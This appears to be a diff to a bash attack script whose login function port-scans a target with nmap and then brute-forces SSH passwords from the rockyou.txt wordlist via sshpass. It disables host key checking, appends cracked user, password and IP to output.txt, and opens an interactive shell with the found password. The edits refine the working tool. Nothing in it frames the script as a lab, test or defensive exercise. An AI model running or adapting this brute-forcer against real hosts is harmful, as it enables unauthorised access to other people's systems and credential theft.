@@ -3,19 +3,20 @@ Red=$'\e[1;31m'
 Green=$'\e[1;32m'
 Blue=$'\e[1;34m'
 Yellow=$'\e[1;33m'
-Reset=$'\e[0,m'
+Reset=$'\e[0;m'
 
 
 login () { #user, ip
 	output=output.txt
 
-	nmap $1 -p 22
+	nmap -sT -p- $2
 	if [ $? -eq 0 ];
 		then
 			pass=""
 			while read line;
 			do
-				if sshpass -p "$line" ssh -t -t $1@$2 -p 22 "set -- '$SSHPATH/$ID'.*; [ -e \"\$1\" ]";
+				echo "$line"
+				if sshpass -p $line ssh -o "StrictHostKeyChecking no" -t -t $1@$2 -p 22 "set -- '$SSHPATH/$ID'.*; [ -e \"\$1\" ]";
 					then
 						pass="$line"
 						echo "$Yellow ##################################################### $Reset"
@@ -23,13 +24,15 @@ login () { #user, ip
 						echo "$Yellow ##################################################### $Reset"
 						echo "$1 $pass $2" | tee -a $output
 						break
+					else
+						echo "Failed"
 				fi
 			done < rockyou.txt
-			sshpass -p "$pass" ssh -t -t "$1"@"$2" -p 22
+			sshpass -p "$pass" ssh -o "StrictHostKeyChecking no" -t -t "$1"@"$2" -p 22
 		else
 			echo "$Red Port is closed!!!  $Reset"
 	fi
-
+	sudo kill -9 `pgrep -f running_script`
 }
 
 
